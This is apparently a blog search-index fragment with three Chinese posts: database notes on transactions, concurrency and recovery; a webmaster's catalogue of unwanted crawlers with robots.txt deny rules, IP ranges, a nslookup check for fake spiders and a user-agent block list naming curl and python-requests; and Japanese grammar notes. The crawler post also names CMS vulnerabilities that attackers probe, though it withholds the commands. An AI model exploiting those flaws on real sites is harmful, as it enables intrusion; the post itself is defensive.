聚集\n使用与去重相同的方法来实现\n### 表达式执行\n#### 物化\n- 每次将执行的结果物化到一个临时关系中\n- **双缓冲**通过并行执行CPU活动与I/O活动，允许算法执行得更快\n#### 流水线\n通过将多个关系运算组成一个运算的流水线来减少临时文件数，其中一个运算的结果将传送到流水线中的下一个运算\n流水线带来的好处：\n- 消除了读和写临时关系的代价，从而减少了查询执行代价\n- 如果一个查询执行计划的根算子及其输入被合并在流水线中，那么就可以迅速开始产生查询结果\n##### 流水线的实现\n- 需求驱动流水线\n    - 系统不停地向位于流水线顶端的运算发出需要元组的请求\n    - 每当一个运算收到需要元组的请求时，它就计算待返回的下一个元组并返回这些元组\n    - 需求驱动流水线中的每个运算都可以作为迭代算子来实现，该迭代算子提供以下函数\n        - open()\n        - next()：每次调用返回运算的下一个输出元组\n        - close()：告知迭代算子不需要元组了\n- 生产者驱动流水线\n    - 各运算并不等待产生元组的请求，而是积极地生产元组\n    - 对于生产者驱动流水线中的每一对相邻的运算，系统会创建一个缓冲区来保存从一个运算传递给下一个运算的元组\n## 事务\n事务是访问并可能更新各种数据项的一个程序执行单元\n数据库系统需要维护以下特性：\n- 原子性：事务的所有操作在数据库中要么全部正确反映出来，要么完全不反映\n- 一致性：以隔离的方式执行事务（没有其他事务的并发执行）以保持数据库的一致性\n- 隔离性：尽管多个事务可能并发执行，但系统保证每个事务都感觉不到系统中有其他事务正在并发执行\n- 持久性：在一个事务成功完成后，它对数据库的改变必须是永久的，即使出现系统故障\n### 一个简单的事务模型\n忽略插入和删除操作，采用以下两种操作来访问数据：\n- read(X)：从数据库把数据项X传送给一个也称为X的变量，X位于属于执行read操作的事务的主缓冲区中\n- write(X)：从执行write的事务的主缓冲区中把变量X的值传送给数据库中的数据项X\n### 事务的原子性和持久性\n事务必须处于以下状态之一：\n- **活跃**状态：为初始状态，当事务执行时就处于这种状态\n- **部分提交**状态：在最后一条语句被执行之后\n- **失效**状态：在发现正常执行不能再继续之后\n- **中止**状态：在事务已回滚并且数据库已被恢复到它在事务开始前的状态之后\n- **提交**状态：在成功完成之后\n\n事务相应的状态图：\n![16](https://d-sketon.top/img/db-book/16.png)\n\n- 成功完成其执行的事务被称为**已提交**\n- 一旦事务已经提交，撤销已提交事务所造成的影响的唯一方式是执行一个**补偿事务**\n- 如果一个事务要么是提交的要么是中止的，它就被称为是已经**终止**的\n- 一旦事务进入了中止状态，系统可以**重启**事务或**杀死**事务\n\n### 事务的隔离性\n允许并发的优点：\n- 提高吞吐量和资源利用率\n- 减少等待时间\n\n在并发执行的情况下，调度应该在某种意义上等价于一个串行调度，这种调度被称为**可串行化**的调度\n### 可串行化\n- 如果I与J是由不同事务在相同数据项上执行的操作，并且其中至少有一条指令是write操作，那么I与J是**冲突**的\n- 如果调度S可以经过一系列非冲突指令的交换而转换成调度S'，则称S'和S是**冲突等价**的\n- 若一个调度S与一个串行调度是冲突等价的，则称调度S是**冲突可串行化**的\n- 如果关于S的优先图中**有环**，则调度S是非冲突可串行化的；反之则是可冲突串行化的\n### 事务的隔离性和原子性\n#### 可恢复调度\n对于每对事务Ti和Tj，如果Tj读取了由Ti之前所写过的数据项，则Ti的提交操作应出现在Tj的提交操作之前\n#### 无级联调度\n- **级联回滚**\n  - 因单个事务失效而导致一系列事务回滚的现象称为\n- **无级联调度**\n  - 对于每对事务Ti和Tj都满足如果Tj读取了先前由Ti所写的一个数据项，则Ti的提交操作必须出现在Tj的这一读操作之前 \n### 事务的隔离性级别\n- **可串行化**：通常保证可串行化的执行\n- **可重复读**：只允许读取已提交的数据，并进一步要求在一个事务两次读取一个数据项期间，其他事务不得更新该数据项\n- **已提交读**：只允许读取已提交的数据，但并不要求可重复读\n- **未提交读**：允许读取未提交数据，最低隔离性级别\n\n以上所有的隔离性级别均不允许**脏写**，即如果一个数据项已被另外尚未提交或中止的事务写过，则不允许再执行写操作\n## 并发控制\n### 基于锁的协议\n#### 锁\n- 共享模式锁（S）：可以读但不能写\n- 排他模式锁（X）：既可以读又能写\n  \n相容函数：\n| |S|X|\n|-|-|-|\n|S|true|false|\n|X|false|false|\n\n- 事务通过lock-S(Q)指令来申请数据项Q上的共享锁\n- 事务通过lock-X(Q)指令来申请数据项Q上的排它锁\n- 事务通过unlock(Q)指令来对数据项Q解锁\n#### 两阶段封锁协议\n该协议要求每个事务分两个阶段提出加锁和解锁请求：\n- **增长阶段**：一个事务可以获得锁，但不能释放任何锁\n- **缩减阶段**：一个事务可以释放锁，但不能获得任何新锁\n\n两阶段封锁并不保证不会发生死锁，且级联回滚是可能发生的\n- **严格两阶段封锁协议**：要求事务所持有的所有排他模式锁必须在事务提交后方可释放（可防止级联回滚）\n- **强两阶段封锁协议**：要求在事务提交之前保留所有的项\n- **锁转换**\n  - 升级：从共享锁到排它锁\n  - 降级：从排它锁到共享锁\n#### 封锁的实现\n- **锁管理器**维护一个称为**锁表**的内存数据结构，用于记录已授予的锁和等待的请求\n  - 事务可以向锁管理器发出锁请求和解锁的请求\n  - 锁管理器针对封锁请求消息采用锁授予的消息，或采用要求事务回滚的消息来进行应答\n##### 基于图的协议\n- 两阶段封锁的替代方案\n- 在数据项的集合上实施一种偏序$\\rightarrow$\n- 树型协议是一种简单的图协议\n    - 确保冲突可串行化以及无死锁\n    - 可以在较早的时候释放锁\n    - 不保证可恢复性和无级联性\n        - 需要引入提交依赖\n    - 一个事务可能必须给它更新不访问的数据项加锁\n### 死锁处理\n#### 死锁预防\n- #1.每个事务在开始执行之前封锁它的所有数据项\n- #2.对所有数据项施加一种次序，同时要求事务只能按照次序规定的顺序封锁数据项\n- #3.使用抢占与事务回滚\n  - 等待-死亡机制：非抢占技术，当Ti申请的数据项被Tj持有，仅当Ti时间戳小于Tj的时间戳，才允许Ti等待\n  - 伤害-等待机制：抢占技术，当Ti申请的数据项被Tj持有，仅当Ti时间戳大于Tj的时间戳，才允许Ti等待\n- #4.基于锁超时，申请锁的事务至多等待一段指定时间，否则超时并回滚\n#### 死锁检测\n使用一种称为**等待图**的有向图来描述\n- 顶点集由系统中的所有事务组成\n- $T_i \\rightarrow T_j$的有向边表示事务$T_i$正等待事务$T_j$释放一个$T_i$所需的数据项\n- 当且仅当等待图中包含环路时，系统中存在死锁\n#### 死锁恢复\n解除死锁最常用的方法是回滚一个或多个事务\n- 选择牺牲者\n  - 回滚产生最低代价的事务\n- 回滚\n  - 完全回滚：中止事务并重新启动\n  - 部分回滚：将事务回滚到可以接触死锁的地方\n- 饿死\n  - 必须保证一个事务被选为牺牲者的次数有限\n### 多粒度\n- 如果一个节点加上了意向模式锁，则意味着在树的较低层进行显式加锁\n- 在一个节点被显式加锁之前，该节点的全部祖先节点均要加上意向锁\n- 封锁按自顶向下的次序，而锁的释放按自底向上的次序\n  \n| |IS|IX|S|SIX|X|\n|-|-|-|-|-|-|\n|IS|true|true|true|true|false|\n|IX|true|true|false|false|false|\n|S|true|false|true|false|false|\n|SIX|true|false|false|false|false|\n|X|false|false|false|false|false|\n- 如果一个节点被加上了意向共享模式锁（IS），那么只能在树的较低层显式加共享模式锁\n- 如果一个节点被加上了意向排他模式锁（IX），那么只能在树的较低层显式加共享或排他模式锁\n- 如果一个节点被加上了共享意向排他模式锁（SIX），则以该节点为更的子树以共享模式被显式封锁，并且在树的更低层显式加排他模式锁\n### 基于时间戳的协议\n#### 时间戳\n- 对系统中的每个事务，使用一个唯一的、固定的时间戳和它关联起来\n- 时间戳在事务开始执行之前由数据库系统所赋予，其决定了可串行化的次序\n  - 系统时钟\n  - 逻辑计数器\n#### 时间戳排序协议\n其保证任何有冲突的read和write操作按时间戳的次序执行\n\n> 每个数据项Q与两个时间戳相关联\n> W-timestamp(Q)表示成功执行write(Q)的任意事务的最大时间戳\n> R-timestamp(Q)表示成功执行read(Q)的任意事务的最大时间戳\n\n- 假设事务T发出read(Q)\n  - 若TS(T) \\< W-timestamp(Q)，则T需要读取的Q值已被覆盖。T回滚\n  - 若TS(T) \\>= W-timestamp(Q)，则执行read操作，且R-timestamp(Q)=max(R-timestamp(Q),TS(T))\n- 假设事务T发出write(Q)\n  - 若TS(T) \\< R-timestamp(Q)，则T产生的Q值是先前所需要的，且假定该值永远不会产生了。T回滚\n  - 若TS(T) \\< W-timestamp(Q)，则T试图写入的Q值是过时的。T回滚\n  - 其他情况，执行write操作，且W-timestamp(Q)=TS(T)\n  \n- 事务如果触发了回滚，系统会赋予它一个新的时间戳并重新启动它\n- 该协议保证冲突可串行化和无死锁\n- 可能存在长事务饿死的现象\n- 可能产生不可恢复的调度\n  - 通过在事务末尾一起执行所有写操作可以保证可恢复性和无级联性\n#### Thomas写规则\n- 假设事务T发出write(Q)\n  - 若TS(T) \\< R-timestamp(Q)，则T产生的Q值是先前所需要的，且假定该值永远不会产生了。T回滚\n  - 若TS(T) \\< W-timestamp(Q)，则T试图写入的Q值是过时的。**write操作被忽略**\n  - 其他情况，执行write操作，且W-timestamp(Q)=TS(T)\n### 基于有效性检查的协议\n有效性检查协议要求每个事务在生命周期中按两个或三个不同的阶段执行\n- 读阶段：系统执行事务T，T的所有write操作是对局部的临时变量进行的，但并不对数据库进行真正的更新\n- 有效性检查阶段：对事物T进行有效性检查的测试，如果测试失败则终止该事务\n- 写阶段：如果通过了有效性检查，则保存T所执行的任何write操作结果的临时局部变量被拷贝入数据库\n\n> StartTS(Ti)：事务Ti开始执行的时间\n> ValidationTS(Ti)：事务Ti完成其读阶段并开始其有效性检查阶段的时间\n> FinishTS(Ti)：事务Ti完成其写阶段的时间\n\n事务T的有效性检查测试要求满足TS(Tk)\\<TS(Ti)的所有事务Tk必须满足下面两个条件之一：\n- FinishTS(Tk)\\<StartTS(Ti)\n- Tk所写的数据项集合和Ti所读的数据项集合不相交，且Ti开始其有效性检查阶段之前，Tk就完成了其写阶段(StartTS(Ti)\\<FinishTS(Tk)\\<ValidationTS(Ti)) \n### 多版本机制\n#### 多版本时间戳排序\n对于每个数据项Q，存在一个版本序列\\<Q1,Q2,...,Qm\\>与之关联，每个Qk包含三个数据字段\n- Content：Qk版本的值\n- W-timeStamp(Q)：创建Qk版本的事务的时间戳\n- R-timeStamp(Q)：所有成功读取过Qk版本的任意事务的最大时间戳\n\n多版本时间戳排序机制：（Qk是Q的如下版本：写时间戳是小于或等于TS(Ti)的最大写时间戳）\n- read(Q)：返回Qk版本的值\n- write(Q)：\n  - 若TS(Ti)<R-timeStamp(Qk)，系统回滚事务\n  - 若TS(Ti)=R-timeStamp(Qk)，系统覆盖Qk的内容\n  - 若TS(Ti)>R-timeStamp(Qk)，创建Q的一个新版本\n\n不保证可恢复性和无级联性\n#### 多版本两阶段封锁\n- 结合多版本并发控制和两阶段封锁\n- 只在只读事务与更新事务之间进行区分\n- 更新事务执行强两阶段封锁\n### 快照隔离\n- 事务被给予两个时间戳\n  - StartTS(Ti)：事务Ti开始的时间\n  - CommitTS(Ti)：事务Ti请求有效性检查的时间\n#### 更新事务的有效性检查步骤\n为了防止更新丢失，快照隔离有两个变种\n- 先提交者胜：第一个进行检查的事务能成功写出更新\n- 先更新者胜：第一个获得锁的事务被运行提交并执行更新\n## 恢复系统\n### 故障分类\n- 事务故障\n  - 逻辑错误：事务由于某些内部情况而无法继续正常执行\n  - 系统错误：系统进入一种不良状态\n- 系统崩溃：硬件故障，或数据库或操作系统存在漏洞\n- 磁盘故障：由于磁头损坏或故障造成磁盘块上内容丢失\n### 恢复与原子性\n#### 日志记录\n- 更新日志记录\\<Ti,Xj,V1,V2\\>\n  - 事务标识\n  - 数据项标识\n  - 旧值\n  - 新值\n- 事务开始\\<Ti start\\>\n- 事务提交\\<Ti commit\\>\n- 事务中止\\<Ti abort\\>\n#### 数据库修改\n- 延迟修改：一个事务直至提交时都没有修改数据库\n- 立即修改：事务仍然活跃时就发生数据库修改\n- 撤销操作：使用一条日志记录，将该日志中指定数据项置为日志记录中包含的**旧值**\n- 重做操作：使用一条日志记录，将该日志中指定数据项置为日志记录中包含的**新值**\n#### 重做和撤销\n- redo(Ti)\n  - 将事务Ti更新过所有数据项的值都置为新值\n  - 重做的执行顺序很重要 \n- undo(Ti)\n  - 将事务Ti更新过的所有数据项的值都置为旧值\n  - 需要写日志记录来记下所执行的更新（read-only日志记录）\n  - 撤销的执行顺序很重要\n  - 撤销操作完成后，需要写一条\\<Ti abort\\>日志 \n\n- 如果日志中包括\\<Ti start\\>，但既不包括\\<Ti commit\\>，也不包括\\<Ti abort\\>，需要撤销\n- 如果日志中包括\\<Ti start\\>，同时包括\\<Ti commit\\>或\\<Ti abort\\>，需要重做\n#### 检查点\n- 检查点的执行过程：\n  - 将当前位于主存的所有日志记录输出到稳定存储器\n  - 将所有修改过的缓冲块输出到磁盘\n  - 将一条形如\\<checkpoint L\\>的日志记录输出到稳定存储器，其中L是执行检查点时正活跃的事务的列表\n- 在系统崩溃后，系统检查日志以找到最后一条\\<checkpoint L\\>记录\n- 只需对L中的事务，以及\\<checkpoint L\\>记录写到日志中之后才开始执行的所有事务进行redo和undo\n### 恢复算法\n#### 事务回滚\n- 从后往前扫描日志，对于所发现的Ti的每条形如\\<Ti,Xj,V1,V2\\>的日志记录\n  - 将值V1写到数据项Xj\n  - 往日志中写一条特殊的read-only日志记录\\<Ti,Xj,V1\\>，其中V1是在本次回滚中数据项被恢复的值\n- 一旦发现了\\<Ti start\\>日志记录，就停止反向扫描，并往日志中写一条\\<Ti abort\\>日志记录\n#### 系统崩溃后的恢复\n- 重做阶段\n  - 将待回滚事务的列表undo-list初始化设定为\\<checkpoint L\\>日志记录中的L\n  - 一旦发现形如\\<Ti,Xj,V1,V2\\>或\\<Ti,Xj,V2\\>的日志记录，就执行重做\n  - 一旦发现形如\\<Ti start\\>的日志记录，就把Ti加到undo-list中\n  - 一旦发现形如\\<Ti abort\\>或\\<Ti commit\\>的日志记录，就把Ti从undo-list中去除\n  - 在重做阶段的末尾，undo-list中包括了在系统崩溃之前尚未完成的所有事务\n- 撤销阶段\n  - 一旦发现属于undo-list中事务的记录，就执行撤销\n  - 当系统发现undo-list中事务Ti的\\<Ti start\\>日志记录，就往日志中写一条\\<Ti abort\\>日志记录，并把Ti从undo-list中去除\n  - 一旦发现undo-list变为空，则撤销阶段结束\n#### 提交处理的优化\n使用**组提交**技术可以提高事务提交的速率\n### 缓冲区管理\n- 将日志记录写到主存的日志缓冲区中\n- 对恢复技术增加 一些额外的要求以保持事务的原子性：\n  - 在日志记录\\<Ti commit\\>输出到稳定存储器后，事务Ti进入提交状态\n  - 在日志记录\\<Ti commit\\>输出到稳定存储器前，与事务Ti有关的所有日志记录必须已经输出到稳定存储器 \n  - 在主存中的数据块输出到数据库（非易失性存储器）前，与该块中数据有关的所有日志记录必须已经输出到稳定存储器\n    - 这一条规则被称为**先写日志**（WAL） \n- 将缓冲的日志写到磁盘有时被称为**强制日志**\n### ARIES\n- 使用**日志序列号**(LSN)来便是日志记录，并将LSN存储在数据库页中\n- 支持**物理逻辑重做**\n- 使用**脏页表**来减少恢复时不必要的重做\n- 视同模糊检查点机制\n#### 数据结构\n- 日志序列号(LSN)\n  - 唯一标识该记录 \n  - 日志记录产生约晚，标号的值越大\n- 日志页序列号(PageLSN)\n  - 每当在页面上执行更新操作时，该操作将其日志记录的LSN存储在该页的PageLSN字段中\n  - 在恢复的重做阶段，LSN值小于等于该页的PageLSN值的任何日志记录将不在该页上执行\n- PrevLSN\n  - 每条日志记录也包含同一事务的前一条日志记录的LSN\n- 补偿日志记录(CLR)\n  - 与read-only日志记录的作用相同  \n  - 同时起到operation-abort日志记录的作用\n- 脏页表\n  - 包含一个在数据库缓冲区中已更新过的页面的列表\n  - 为每一页保存其PageLSN和RecLSN（有助于标识已经实施于该页在磁盘上的版本的日志记录）\n  - RecLSN反应出当前页面被加到脏页表中时日志末端的LSN，其应该大于或等于稳定存储器上该页的PageLSN\n- 检查点日志记录\n  - 包含脏页表和活跃事务的列表\n  - 为每个事务记录其LastLSN（该事务所写的最后一条日志记录的LSN） \n#### 恢复算法\n##### 分析阶段\n- 分析阶段找到最后、已完成的检查点日志记录，并将该记录读入脏页表\n- 将RedoLSN设置为脏页表中那些页的RecLSN的最小值\n  - 如果没有脏页，就将RedoLSN设置为检查点日志记录的LSN\n- 从RedoLSN开始扫描日志，将undo-list初始设置为检查点日志记录中的事务列表\n  - 只要找到一条不在undo-list中的事务的日志记录，就把该事务添加到undo-list\n  - 只要找到一个事务的end记录，就把该事务从undo-list中删除\n##### 重做阶段\n从RedoLSN开始正向扫描日志，只要找到一条更新记录，就：\n- 如果该页不在脏页表中，或该更新日志的LSN小于脏页表中该页的RecLSN，则跳过该记录\n- 否则，从磁盘调出该页，如果其PageLSN小于该日志记录的LSN，就重做该记录\n##### 撤销阶段\n对日志进行反向扫描，对undo-list中的所有事务进行撤销\n- 撤销阶段产生一个包含撤销执行动作的CLR，并将该CLR的UndoNextLSN设定为该更新日志记录的PrevLSN\n#### 其他特性\n- 嵌套的顶层动作\n- 恢复独立性\n- 保存点\n- 细粒度封锁\n- 恢复最优化","tags":["数据库"],"categories":["计软杂谈","学习笔记"]},{"title":"个人博客无用和恶意爬虫整理","url":"/reimu-lighthouse/20220712/spider-collection/","content":"> 数据来源于2022/6/27-2022/7/11 本人CDN日志\n## 无用爬虫\n> 以下信息均来源于各自爬虫的官网，如需知道详细信息请进入UA中的官网查看\n### AhrefsBot\nAhrefs Bot 为 Ahrefs 在线营销工具集的数据库提供支持。Ahrefs 作为国外的 SEO 工具，通常被用在 SEO 关键字调研、独立站外链建设、竞争对手外链反查上。而对于面向国内个人博客的网站则没什么明显用途。\n\nUA\n```text\nMozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)\n```\nrobot.txt\n```text\nUser-agent: AhrefsBot\nDisallow: /\n```\n爬虫IP范围\n```text\n54.36.148.0/24\n54.36.149.0/24\n195.154.122.0/24\n195.154.123.0/24\n195.154.126.0/24\n195.154.127.0/24\n51.222.253.0/26\n168.119.64.245\n168.119.64.246\n168.119.64.247\n168.119.64.248\n168.119.64.249\n168.119.64.250\n168.119.64.251\n168.119.64.252\n168.119.64.253\n168.119.64.254\n168.119.65.107\n168.119.65.108\n168.119.65.109\n168.119.65.110\n168.119.65.111\n168.119.65.112\n168.119.65.113\n168.119.65.114\n168.119.65.115\n168.119.65.116\n168.119.65.117\n168.119.65.118\n168.119.65.119\n168.119.65.120\n168.119.65.121\n168.119.65.122\n168.119.65.123\n168.119.65.124\n168.119.65.125\n168.119.65.126\n168.119.65.43\n168.119.65.44\n168.119.65.45\n168.119.65.46\n168.119.65.47\n168.119.65.48\n168.119.65.49\n168.119.65.50\n168.119.65.51\n168.119.65.52\n168.119.65.53\n168.119.65.54\n168.119.65.55\n168.119.65.56\n168.119.65.57\n168.119.65.58\n168.119.65.59\n168.119.65.60\n168.119.65.61\n168.119.65.62\n168.119.68.117\n168.119.68.118\n168.119.68.119\n168.119.68.120\n168.119.68.121\n168.119.68.122\n168.119.68.123\n168.119.68.124\n168.119.68.125\n168.119.68.126\n168.119.68.171\n168.119.68.172\n168.119.68.173\n168.119.68.174\n168.119.68.175\n168.119.68.176\n168.119.68.177\n168.119.68.178\n168.119.68.179\n168.119.68.180\n168.119.68.181\n168.119.68.182\n168.119.68.183\n168.119.68.184\n168.119.68.185\n168.119.68.186\n168.119.68.187\n168.119.68.188\n168.119.68.189\n168.119.68.190\n168.119.68.235\n168.119.68.236\n168.119.68.237\n168.119.68.238\n168.119.68.239\n168.119.68.240\n168.119.68.241\n168.119.68.242\n168.119.68.243\n168.119.68.244\n168.119.68.245\n168.119.68.246\n168.119.68.247\n168.119.68.248\n168.119.68.249\n168.119.68.250\n168.119.68.251\n168.119.68.252\n168.119.68.253\n168.119.68.254\n```\n### SemrushBot\nSemrushBot 为 Semrush 发现和收集新的和更新的 Web 数据。SemrushBot 收集的数据主要用于分析页面 SEO、外链搜索等。同样对于面向国内个人博客的网站没什么明显用途。\n\nUA\n```text\nMozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)\n```\nrobot.txt\n```text\nUser-agent: SemrushBot\nDisallow: /\nUser-agent: SiteAuditBot\nDisallow: /\nUser-agent: SemrushBot-BA\nDisallow: /\nUser-agent: SemrushBot-SI\nDisallow: /\nUser-agent: SemrushBot-SWA\nDisallow: /\nUser-agent: SemrushBot-CT\nDisallow: /\nUser-agent: SemrushBot-BM\nDisallow: /\nUser-agent: SplitSignalBot\nDisallow: /\nUser-agent: SemrushBot-COUB\nDisallow: /\n```\n无固定IP范围\n### Barkrowler\nBarkrowler 爬虫为 Babbar.tech 提供在线营销和SEO 参考工具。其对于面向国内个人博客的网站没什么明显用途。\n\nUA\n```text\nMozilla/5.0 (compatible; Barkrowler/0.9; +https://babbar.tech/crawler)\n```\nrobot.txt\n```text\nUser-agent: barkrowler\nDisallow: /\n```\n无固定IP范围\n### PetalBot\nPetalBot 是 Petal 搜索引擎的爬虫。该搜索引擎虽然是华为出品，但实际上国内并不能正常访问，所以可以考虑将其屏蔽。\n\nUA\n```text\nMozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)\nMozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)\n```\nrobot.txt\n```text\nUser-agent: PetalBot\nDisallow: /\n```\n未明确提及IP范围\n### coccocbot-web\ncoccocbot是 Coc Coc 搜索引擎的爬虫。该搜索引擎来自越南，所以对国内网站没有任何帮助。\n\nUA\n```text\nMozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)\n```\nrobot.txt\n```text\nUser-agent: coccocbot-web\nDisallow: /\n```\n未明确提及IP范围\n### CensysInspect\nCensys平台帮助信息安全从业人员发现、监控和分析网络设备。对于个人网站也没有什么实际用途。\n\nUA\n```text\nMozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)\n```\nrobot.txt\n```text\nUser-agent: CensysInspect\nDisallow: /\n```\n爬虫IP范围\n```text\n162.142.125.0/24\n167.94.138.0/24\n167.94.145.0/24\n167.94.146.0/24\n167.248.133.0/24\n2602:80d:1000:b0cc:e::/80\n2620:96:e000:b0cc:e::/80\n```\n### BLEXBot\nBLEXBot 帮助互联网营销人员获取有关网站链接结构及其在网络上的相互链接的信息，以避免任何技术和可能的法律问题，并改善整体在线体验。其对于面向国内个人博客的网站没什么明显用途。\n\nUA\n```text\nMozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)\n```\nrobot.txt\n```text\nUser-agent: BLEXBot\nDisallow: /\n```\n未明确提及IP范围\n### SeznamBot\nSeznamBot 是 Seznam 搜索引擎的爬虫。该搜索引擎来自捷克，所以对国内网站没有任何帮助。\n\nUA：\n```text\nMozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)\nMozilla/5.0 (compatible; SeznamBot/3.2-test4; +http://napoveda.seznam.cz/en/seznambot-intro/)\nMozilla/5.0 PhantomJS (compatible; Seznam screenshot-generator 2.1; +http://fulltext.sblog.cz/screenshot/)\nMozilla/5.0 (compatible; Seznam screenshot-generator 2.0; +http://fulltext.sblog.cz/screenshot/)\nMozilla/5.0 (compatible; Seznam screenshot-generator 2.1; +http://fulltext.sblog.cz/screenshot/)\nMozilla/5.0 (Linux; U; Android 4.1.2; cs-cz; Seznam screenshot-generator Build/Q3) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\n```\nrobot.txt\n```text\nUser-agent: SeznamBot\nDisallow: /\n```\n爬虫IP范围\n```text\nSeznamBot\n77.75.76.x\n77.75.77.x      \n77.75.78.x\n77.75.79.x\n2a02:598:aaaa:2::x\n2a02:598:bbbb:2::x\nFreshBot\n77.75.77.31\n77.75.79.31\nTest version\n77.75.73.26\nscreenshot-generator\n77.75.77.123\n77.75.77.174\n77.75.77.200\n77.75.79.123\n77.75.79.200\n2a02:598:2::1123\n2a02:598:2::1200\n```\n### DataForSeoBot\nDataForSEO Link Bot 确保 SEO 社区的每个成员都能接触到 Google 排名算法的核心元素关键。其对于面向国内个人博客的网站没什么明显用途。\n\nUA\n```text\nMozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)\n```\nrobot.txt\n```text\nUser-agent: DataForSeoBot\nDisallow: /\n```\n未明确提及IP范围\n## 恶意爬虫\n### 爬取wp-login.php\nwp-login.php为WordPress站点登录页面，不法分子可以通过机器扫描该文件来尝试爆破攻击你的网站。如果采用WordPress建站的需要考虑采用保护措施，如修改登录文件名，或通过nginx禁止访问请求。\n本次采用的Hexo静态建站，所以并不存在该文件，但仍然在日志中找到了大量IP尝试寻找该文件，请注意提防。\n### 服务器攻击\n通过攻击命令寻找服务器漏洞，并进行攻击，多使用getshell漏洞或远程代码执行漏洞。\n在日志中了解到已知的攻击命令包含漏洞：\n- Ueditor编辑器任意文件上传漏洞\n- DedeCMS 5.7远程文件包含漏洞\n- FCKeditor编辑器上传漏洞\n- ECSHOP远程代码执行漏洞\n- SiteServer CMS漏洞\n- PHPCMS任意文件上传漏洞\n- TPshop漏洞\n- thinkPHP远程代码执行漏洞\n- 狮子鱼社区团购系统CMS任意文件上传漏洞\n\n攻击命令不便展示，请注意以上漏洞并及时修复！\n\n### 虚假爬虫\n本人在翻看CDN日志时发现了百度爬虫大量爬取本人的网站，其UA非常正常\n```text\nMozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\n```\n但通过百度站长后台可以知道百度爬虫根本就没有爬取（泪目）。\nwindows下可以通过以下命令来查询爬虫\n```bash\nnslookup [爬虫的IP地址]\n```\n如果是官方的爬虫则会显示IP的DNS记录，并该记录与官方所提供的相符\n```text\n名称:    baiduspider-220-181-108-91.crawl.baidu.com\nAddress:  220.181.108.91\n```\n虚假爬虫会显示找不到，或与与官方所提供的不符，注意屏蔽\n```text\n*** 找不到 [IP地址]: Non-existent domain\n```\n## 个人爬虫\n个人爬虫如果没有指定UA的话，默认可能会显示如下的UA，请注意屏蔽\n```text\nlibcurl-agent\npython-requests\nJakarta Commons-HttpClient\ncurl\nJava\nfeedfinder2\n```","tags":["爬虫"],"categories":["计软杂谈"]},{"title":"《大家的日语》文法整理","url":"/reimu-lighthouse/20220709/nihongo-bunpou/","content":"本笔记仅整理来自于《大家的日语》（みませんの日本語）1-22课内的文法部分，可能会有疏漏的部分，敬请谅解\n\n<!-- more -->\n\n## 助词归纳\n### は\n表示其前面的名词是句子的主题（1.1）\n- 私**は**会社員です。\n### も\n用于将相同的事物作为前提加以陈述时（1.4）\n- 私は会社員です。ミラーさん**も**会社員です。\n\n用于对疑问词所问范畴的一切全部加以否定时，动词使用否定（5.2）\n- どこ**も**行きません。\n### の\n当名词1表示名词2的属性时，用来连接这两个名词（1.5）\n- ミラーさんはIMC**の**社員です。\n\n当名词1用来说明名词2与什么事物有关系时，用来连接这两个名词（2.5）\n- これはコンピューター**の**本です。\n\n当名词1表示名词2的所属（2.5）\n- これは私**の**本です。\n\n答语中，代替问句中出现的名词，不能代替人（2.6）\n- このかばんはあなたのですか。······いいえ、わたし**の**じゃありません。\n\n表示方向和位置（10.4）\n- 机**の**上に写真があります。\n### か\n表示说话人不肯定或疑问的语气，构成疑问句（1.3）\n- ミラーさんは会社員です**か**。\n\n用于两个及两个以上的并列疑问句进行选择回答的选择疑问句，可翻译为“或者，还是”（2.4）\n- これは「9」です**か**、「7」です**か**。\n\n表示邀请人一起来做某事（6.6）\n- いっしょうに京都へ行き**ませんか**。\n\n说话人在得到自己所不知道的新信息之后表示认可、理解（6.8）\n- 日曜日京都へ行きました。······京都です**か**。いいですね。\n### に\n表示动作进行的时间（4.3）\n- 6時半**に**起きます。\n\n\n> 具体时间后需要加，如6時半、7月2日\n>「~曜日」、「朝」、「昼」、「晩」、「夜」后可加可不加\n\n\n表示授受动词接受/提供事物、信息的对象（非公司、学校等组织）（7.3/7.4）\n- イーさん**に**本を貸しました。\n- イーさん**に**本を借りました。\n\n表示物和人存在的场所（10.2）\n- 私の部屋**に**机があります。\n- 机は私の部屋**に**あります。\n\n表示频度（11.3）\n- 1か月**に**2回映画を見ます。\n\n表示目的（13.3）\n- 明日京都のお祭り**に**行きます。\n\n表示主语因某一动作的结果而存在于某一场所（15.4）\n- ここ**に**入ってはいけません。\n\n表示动作的结果或名词存在的场所（15.5）\n- ここ**に**車を止めてください。\n\n表示变化的结果（19.4）\n- 元気**に**なります。\n### から\n表示起点（时间、场所）（4.4）\n- 9時**から**働きます。\n\n表示授受动词接受/提供事物、信息的对象（公司、学校等组织必须用该助词）（7.4）\n- 銀行**から**お金を借りました。\n\n表示原因（9.4）\n- 時間がありません**から**、新聞を読みません。\n\n表示动作相继进行（动词て形）（16.2）\n- この仕事が終わって**から**、食べます。\n### まで\n表示终点（时间、场所）（4.4）\n- 9時から5時**まで**勉強します。\n### と\n表示名词并列，可翻译为“和”（4.5）\n- 銀行の休みは土曜日**と**日曜日です。\n\n表示与自己一起行动的人或动物（5.4）\n- 家族**と**日本へ来ました。\n\n表示比较的对象（12.4）\n- 春**と**秋**と**どちらが好きですか。\n\n表示思考、判断、发言的内容（21.1/21.2）\n- 明日雨が降る**と**思います。\n- 寝る前に、「おやすみなさい」**と**言います。\n### ね\n接在句尾，表示说话人希望得到听话人的同意或说话人对某一事物加以确认、叮嘱的语气（4.6）\n- 毎日10時まで勉強します。······大変です**ね**。\n### へ\n表示移动的方向（5.1）\n- 日本**へ**来ました。\n### て\n用于连接两个及以上连续发生的动作（16.1）\n- 